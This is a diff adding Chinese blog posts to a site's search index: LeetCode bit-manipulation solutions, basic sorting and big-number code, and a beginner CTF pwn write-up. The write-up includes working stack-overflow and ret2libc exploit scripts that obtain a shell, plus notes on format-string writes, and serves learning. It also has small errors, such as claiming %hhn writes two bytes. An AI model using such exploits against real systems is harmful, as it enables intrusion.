@@ -178,6 +178,192 @@
       </tags>
   </entry>
   <entry>
+    <title>位运算</title>
+    <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
+    <content><![CDATA[<p> 位运算基础概念以及题目：</p>
+<span id="more"></span>
+
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="位与"><a href="#位与" class="headerlink" title="位与"></a>位与</h4><p>符号：&amp;</p>
+<p>12&amp;10—&gt;1100&amp;1010（转换为二进制）</p>
+<p>从低到高按位运算，当两个数字都为1，结果才为1，否则为0，因此结果为1000，也就是8</p>
+<h4 id="位或"><a href="#位或" class="headerlink" title="位或"></a>位或</h4><p>符号：|</p>
+<p>12|10—–&gt;1100|1010</p>
+<p>从低到高按位运算，当两个数字都为0，结果才为0，否则为1，因此结果为1110，也就是14</p>
+<p>小概念：相同的数异或为0，任何数与0异或为它本身，满足交换律和结合律</p>
+<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>符号：^</p>
+<p>12^10—–&gt;1100^1010</p>
+<p>从低到高按位运算，当两个数字都不同，结果才为1，否则为0，因此结果为0110，也就是6。</p>
+<p>从结果来看，异或可以看作不进位的加法</p>
+<h4 id="左移"><a href="#左移" class="headerlink" title="左移"></a>左移</h4><p>符号：&lt;&lt;</p>
+<p>12&lt;&lt;3—–&gt;1100&lt;&lt;3</p>
+<p>想左移三位，末尾补零，因此结果为1100000.另外，左移一位可以看作该数字乘二。</p>
+<h4 id="右移"><a href="#右移" class="headerlink" title="右移"></a>右移</h4><p>符号: &gt;&gt;</p>
+<p>12&gt;&gt;3—–&gt;1100&gt;&gt;3=1</p>
+<p>右移三位，右移一位可看作除二向下取整</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2的幂"><a href="#2的幂" class="headerlink" title="2的幂"></a>2的幂</h4><p><a href="https://leetcode.cn/problems/power-of-two/">https://leetcode.cn/problems/power-of-two/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;<span class="number">0</span>&amp;&amp;(n&amp;(n<span class="number">-1</span>))==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解析：当一个数为2的幂时，他的表达方式一定为100000….，这个数n表达方式固定，n-1则确定为0111111….。因此对n和n-1取位与，结果一定为1，因此可判断。</p>
+<h4 id="4的幂"><a href="#4的幂" class="headerlink" title="4的幂"></a>4的幂</h4><p><a href="https://leetcode.cn/problems/power-of-four/">https://leetcode.cn/problems/power-of-four/</a></p>
+<p>解析：分析可知：$2^{2x}mod 3=1$ 且 $2^{2x+1}mod 3=2$ 因此可以得出结论$4^xmod3=1$ 。因此，当一个数n是2的幂，同时模3为1，则他一定是4的幂</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool isPowerOfFour(int n)&#123;</span><br><span class="line">    return (n&gt;0)&amp;&amp;(n&amp;(n-1))==0&amp;&amp;n % 3==1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="位1的个数"><a href="#位1的个数" class="headerlink" title="位1的个数"></a>位1的个数</h4><p><a href="https://leetcode.cn/problems/number-of-1-bits/">https://leetcode.cn/problems/number-of-1-bits/</a></p>
+<p>解析：任何一个数字的二进制表示必然可以表示为0，1的组合，当一个数字的二进制形式为….1000时我们把它减去1，则变为形式…..0111,当我们把这两个数进行位与运算，得到的结果为…..0000。我们发现最末尾的1被我们消除了，当我们重复这个过程，在这个过程中记录进行的次数，当最后n变为0时，计数结果就为1的个数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">uint32_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="type">int</span> ans=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        n=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="交换数字"><a href="#交换数字" class="headerlink" title="交换数字"></a>交换数字</h4><p><a href="https://leetcode.cn/problems/swap-numbers-lcci/">https://leetcode.cn/problems/swap-numbers-lcci/</a></p>
+<p>解法：</p>
+<ul>
+<li>a=a^b</li>
+<li>b=a^b=a^b^b=a^0=a</li>
+<li>a=a^b=a^a^b=b</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">swapNumbers</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> aSize, <span class="type">int</span>* returnSize)</span>&#123;</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">1</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    *returnSize=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h4><p><a href="https://leetcode.cn/problems/single-number/">https://leetcode.cn/problems/single-number/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=sum^nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解法：很巧妙的解法，根据异或的性质，我们发现当我们从头开始循环异或，出现两次的数必然可以结合异或结果为0，最后只剩下异或结果为本身的数，这个数就是出现一次的数。(草，真的牛逼)</p>
+<h4 id="汉明距离"><a href="#汉明距离" class="headerlink" title="汉明距离"></a>汉明距离</h4><p><a href="https://leetcode.cn/problems/hamming-distance/">https://leetcode.cn/problems/hamming-distance/</a></p>
+<p>解析：把两个数字异或，我们发现结果为1的位上就是两个数字对应二进制位不同的位置，因此我们把异或后的结果进行1消去，同时统计1的个数，答案就是汉明距离。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingDistance</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">    <span class="type">int</span> n=x^y;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        n=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="交替位二进制数"><a href="#交替位二进制数" class="headerlink" title="交替位二进制数"></a>交替位二进制数</h4><p><a href="https://leetcode.cn/problems/binary-number-with-alternating-bits/">https://leetcode.cn/problems/binary-number-with-alternating-bits/</a></p>
+<p>解析：题目意思可以视为判断数字n的二进制表达形式是否为01连续出现，我们判断当00和11出现时对应的十进制数字为0和3，因此我们将数字n与3位与，如果符合题意，得到的结果只能是10或者01，即为1，2，如果出现0，3，则说明n中出现了00，11的组合，则返回false。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((n&amp;<span class="number">3</span>)==<span class="number">0</span>||(n&amp;<span class="number">3</span>)==<span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        n=n&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="找出所有子集的异或总和再求和"><a href="#找出所有子集的异或总和再求和" class="headerlink" title="找出所有子集的异或总和再求和"></a>找出所有子集的异或总和再求和</h4><p><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/">https://leetcode.cn/problems/sum-of-all-subset-xor-totals/</a></p>
+<p>解析：这个题我搞了半天（md我怎么这么菜），首先是我们要明白一个数组的子集个数是2的元素个数的次方，因此第一个循环是为了找到所有的子集，当我们找到所有子集之后，我们要对每一个子集进行分析，因为集合中的元素在子集中只会有两种状态，0（未出现）和1（出现），因此，<strong>每个子集都可以表示为一个二进制数字</strong>，比如数组[2,3,4]的子集之一[2,3]，用相对应的二进制数字来表示就是110。这样表示完每一个子集后，我们对每一个二进制数进行分析，当我们在二进制数中寻找到1时，说明对应的数组nums[i]在子集中存在，就可以进行异或操作了，而寻找二进制数中的1可以用一个表达式来解决:**i&amp;(1&lt;&lt;j)**。意思是寻找二进制数i在第j位是否为1。当第二次循环遍历二进制数位数之后，我们就可以确定存在的元素，就可以进行必要的异或和相加的操作了。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">subsetXORSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,ans;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;numsSize);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) ans^=nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="两整数之和"><a href="#两整数之和" class="headerlink" title="两整数之和"></a>两整数之和</h4><p>阴间题目，要求不能用+，-完成两数求和。</p>
+<p><a href="https://leetcode.cn/problems/sum-of-two-integers/">https://leetcode.cn/problems/sum-of-two-integers/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b==<span class="number">0</span>?a:getSum(a^b,(<span class="type">unsigned</span> <span class="type">int</span>)(a&amp;b)&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析：首先已知a^b可以表示为不考虑a和b的情况下a和b的家和，因此我们要找到进位情况下进的位的那个数字，是(a&amp;b)&lt;&lt;1，因此呢我们只要递归运算a^b和(a&amp;b)&lt;&lt;1的和即可。每次当我们进行(a&amp;b)&lt;&lt;1时，产生的结果0，1分别代表着不进位，进位。因此，如果不进位，结果就是a^b，即返回函数参数“a”。而当结果不为0，即连个数字都为1时，需要进位，进位则表示着这一个1在后一位相加，而后一位的相加同样可以表示为上述过程，仔细思考可以发现，递归出口在函数参数”b”为0的时候，这个时候进位完毕，输出结果a^b就是最后答案。</p>
+<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p><a href="https://leetcode.cn/problems/insert-into-bits-lcci/">https://leetcode.cn/problems/insert-into-bits-lcci/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">insertBits</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> M, <span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=j;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        N&amp;=~((<span class="type">long</span> <span class="type">long</span>)<span class="number">1</span>&lt;&lt;k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> N|(M&lt;&lt;i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解析：博主摆烂了…</p>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>C++</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
+<span id="more"></span>
+
+<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png"></p>
+<p>再看伪代码：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png"></p>
+<p>再看偏移量：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png"></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a520.png"></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a521.png"></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
+</ul>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a522.png"></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a523.png"></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
+<p>%d:打印成数字，只能泄露栈本身内容</p>
+<p>%x:打印成16进制，只能泄露栈本身内容</p>
+<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
+<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
+<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
+<p>%hn:写入两个字节</p>
+<p>%hhn:写入两个字节</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>啥都没有，因为懒得搞，搞堆去了</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg"></p>
+]]></content>
+      <categories>
+        <category>CTF!</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础算法01</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
+    <content><![CDATA[<p> 这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
+<p>主要是：排序总结，高精度总结。</p>
+<span id="more"></span>
+
+<h3 id="排序模板"><a href="#排序模板" class="headerlink" title="排序模板"></a>排序模板</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
+<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，……的排序，至此排序完成。</p>
+<p>核心代码如下:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
+<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
+<p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
+<p>核心代码大同小异，这里我就摆一种：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>排序就先摆两个吧，有空了再贴(画饼</p>
+<h3 id="高精度计算"><a href="#高精度计算" class="headerlink" title="高精度计算"></a>高精度计算</h3><h4 id="a-b高精度"><a href="#a-b高精度" class="headerlink" title="a+b高精度"></a>a+b高精度</h4><p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
+<p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
+<p><strong>实现代码：</strong></p>
+<p>读入数组部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>计算部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>全部代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span 